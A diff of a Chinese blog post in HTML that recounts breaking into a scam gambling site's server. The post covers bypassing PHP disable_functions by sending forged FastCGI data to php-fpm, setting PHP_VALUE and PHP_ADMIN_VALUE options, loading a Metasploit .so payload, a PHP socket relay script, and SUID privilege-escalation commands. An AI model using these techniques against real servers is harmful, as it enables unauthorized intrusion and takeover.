@@ -1,10 +1,10 @@
 <h2><a href="https://github.com/knightyun/knightyun.github.io/blob/master/_posts/2021-12-06-exploit-penetrate-bocai-website.md">仓库源文</a>，<a href="https://knightyun.github.io/2021/12/06/exploit-penetrate-bocai-website">站点原文</a></h2>
 <hr/>
-<h2>title: 后记：菠菜站点的攻克之旅
+<p>title: 后记：菠菜站点的攻克之旅
 layout: post
 categories: Exploit
-tags: exploit hack 渗透 安全
-excerpt: 远离套路，远离损失</h2>
+tags: exploit hack 渗透 安全</p>
+<h2>excerpt: 远离套路，远离损失</h2>
 <p>故事发生在上次事件（<a href="https://knightyun.github.io/2021/09/04/exploit-take-down-swindle-website">https://knightyun.github.io/2021/09/04/exploit-take-down-swindle-website</a>）之后，算是作为一个收尾，但也算是另一个开始 (⌐■_■)，顺便记录下相关操作；</p>
 <h2>前情提要</h2>
 <p>上回故事说到，骗子服务器的最高权限虽然已经拿到，但这也只是技术层面的掌控，想要立案，需要提供尽量多的人员相关信息，如手机、银行卡等，但这些目前都并未采集到（前面虽然提到了某次源码有个银行账户，但后面发现那只是个测试号，百度出来一堆在用的…），所以还需要通过一些额外的手段去获取有用的信息；</p>
@@ -104,11 +104,11 @@ excerpt: 远离套路，远离损失</h2>
 <p>其实该方法的原理大致就是：php 是一门动态语言，但 <code>nginx</code> 是无法处理这些的，所以中间还有个 <code>fastcgi</code> 协议在牵线搭桥，可类比 <code>HTTP</code> 协议，nginx 将接受到的客户端请求转换成 fastcgi 协议格式的数据，而 php 模块中的 <code>php-fpm</code> 就是用来处理这些 fastcgi 协议数据的，然后再传给 php 解释器去处理，完成后结果数据又以之前同样的路径返回到浏览器客户端；所以一般在 Linux 服务器上启动 php 程序，都会启动一个叫 php-fpm 的服务，一般会监听本机的 <code>9000</code> 端口，或者套接字文件，nginx 的配置文件 fastcgi 访问地址也配成这个端口或文件，这些都是为了完成上述通信过程；</p>
 <p>这里面可<strong>利用</strong>的点就是，绕过通往 nginx 的请求，直接与 php-fpm 服务沟通，理想情况就是由于配置失误导致 9000 监听在了外网接口而不是本机接口，当然这种情况也是极少数，但这也并不意味着监听本机就无法利用了，在 php 程序文件可写的前提下，可以在程序中通过 <code>curl</code> 接口向服务器本机 9000 端口发起请求（或 <code>stream_socket_client</code> 发起套接字文件通信请求），并且是模仿 fastcgi 客户端发送对应格式的数据，这样就能实现绕过 nginx 直接与 php-fpm 沟通；这种操作还有另一种说法，叫 <strong>SSRF</strong>（<code>Server-Side Request Forgery</code>），即<strong>服务端请求伪造</strong>，通过服务器去实现访问客户端正常不能访问到的内网资源；当然还有一个和他名字很像的手段： <strong>CSRF</strong>（<code>Cross-Site Request Forgery</code>，跨站请求伪造），只不过这个是盗用其他客户端的登录凭证；</p>
 <p>可能这里还有个问题，这样绕了一圈去建立通信，最后不是还是会通过 php-fpm 吗，这样配置的函数限制依然存在，其实不然，直接和 php-fpm 沟通的话，它是支持<strong>修改</strong> php 配置的，就是 fastcgi 协议中的 <code>PHP_VALUE</code>, <code>PHP_ADMIN_VALUE</code> 这两个参数，比如可以设置这两个配置：</p>
-<pre><code class="language-bash">"PHP_VALUE": "auto_prepend_file = php://input"
+<pre><code class="lang-bash">"PHP_VALUE": "auto_prepend_file = php://input"
 "PHP_ADMIN_VALUE": "allow_url_include = On"
 </code></pre>
 <p>这会导致执行 php 程序之前包含 <code>HTTP</code> 中 <code>POST</code> 的数据，实现任意代码执行的目的，但即使这样也还是不行，因为这里的任意代码执行依然逃不开 php 配置文件的控制，所以就还需要更进一层，可以利用 <code>extension</code> 这个环境变量，设置执行脚本是要引入的动态链接库文件（Linux 下是 <code>.so</code>，Windows 下是 <code>.dll</code>）：</p>
-<pre><code class="language-bash">"PHP_VALUE": "extension = /xxx/xxx.so"
+<pre><code class="lang-bash">"PHP_VALUE": "extension = /xxx/xxx.so"
 </code></pre>
 <p>这就需要有任意文件上传权限，不过都开始研究限制绕过了，这点权限是肯定有的，然后就是编译构造自己的 <code>.so</code> 文件，并向其中添加要执行的系统命令，这样链接库文件在被引入的时候就会执行预定的命令，同时也不受 php 配置文件的限制；这个sao操作也是在研究那个插件代码时发现的 (¬‿¬)，同时也通过抓包找到了之前一直返回空数据的原因：</p>
 <p><img alt="fiddler-ant-fpm-request" src="https://img-blog.csdnimg.cn/8d4b636ac71446e59ab5d8b90e6b03ab.png"/></p>
@@ -120,7 +120,7 @@ excerpt: 远离套路，远离损失</h2>
 <p>其实就是利用远程指令执行运行了另一个 php 服务，自定义了端口，并且 <code>-n</code> 参数是不使用 php 配置文件的意思，这样就实现了绕过 <code>disable_functions</code>，方便让其他程序畅通无阻的运行虚拟终端，手段确实有趣，不过这里就大可不必了，都能执行命令了还要虚拟终端干啥，另外经过测试也发现这样连接有一定时效性，大概一分钟左右就会断开连接，原因未知，所以为了后续更愉快的玩耍，直接上 <code>msf payload</code>，生成 <code>elf-so</code> 格式的文件后上传站点，然后把自定义的 fastcgi 客户端(<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>)参数改下，让包含的 <code>.so</code> 文件为我们的 <code>payload</code> 文件以使其运行：</p>
 <p><img alt="cmd-edit-fpm-py" src="https://img-blog.csdnimg.cn/11349adc0f404953aae8846927fefef9.png"/></p>
 <p>运行后就会得到构造后的 <code>fastcgi</code> 协议数据（TCP数据流），让服务器 php 发送它就好，所以还需要服务端写个 php 程序来配合发送，这是使用使用套接字文件通信时的文件内容：</p>
-<pre><code class="language-php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 ini_set("display_errors", "On");
 error_reporting(E_ALL);
 
@@ -140,7 +140,7 @@ if (!$fp) {
 }
 </code></pre>
 <p>如果是监听本地 <code>9000</code> 端口，可以使用 <code>fsockopen</code> 协议来发送 fastcgi 协议数据，具体就是：</p>
-<pre><code class="language-php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 ini_set("display_errors", "On");
 error_reporting(E_ALL);
 
@@ -150,12 +150,12 @@ $url = $_GET['url'];
 if (!$fp) {
     echo "Error: $errstr ($errno)&lt;br /&gt;\n";
 } else {
-	try {
-	    fwrite($fp, base64_decode($_GET['url']));
-		var_dump(fread($fp, 8192));
-	} catch (Exception $e) {
-		print_r($e);
-	}
+    try {
+        fwrite($fp, base64_decode($_GET['url']));
+        var_dump(fread($fp, 8192));
+    } catch (Exception $e) {
+        print_r($e);
+    }
     fclose($fp);
 }
 </code></pre>
@@ -187,10 +187,10 @@ if (!$fp) {
 <h3>Suid 提权</h3>
 <p>简单说 <code>suid</code> 是一种权限，它运行具有该权限的文件执行时，能以该文件所有者的权限执行，例如具有所有用户读写执行的文件权限是 <code>rwxrwxrwx</code>，那么它再具有 <code>suid</code> 权限就会是 <code>rwsrwxrwx</code> （第三位是 <code>s</code>），权限码就是 <code>4777</code>，这里可利用的地方就是，假如某个文件所有者是 <code>root</code> 账户，并且其他用户可执行，那么其他用户在执行时，就间接有了 root 权限；</p>
 <p>例如利用 <code>find</code> 提权执行 <code>whoami</code> 就是：</p>
-<pre><code class="language-bash">find some-file -exec whoami
+<pre><code class="lang-bash">find some-file -exec whoami
 </code></pre>
 <p>可以先查找一下全系统就有该权限特征的文件：</p>
-<pre><code class="language-bash">find / -user root -perm -4000 -type f 2&gt;/dev/null
+<pre><code class="lang-bash">find / -user root -perm -4000 -type f 2&gt;/dev/null
 </code></pre>
 <p><img alt="msf-shell-find-suid" src="https://img-blog.csdnimg.cn/9e6f005b40984dbbbe154b254a8b6709.png"/></p>
 <p>虽然有不少但是没有找到可利用的，常见的可利用程序和利用参数大致有（执行高权限的文件或查看高权限文件内容）：</p>
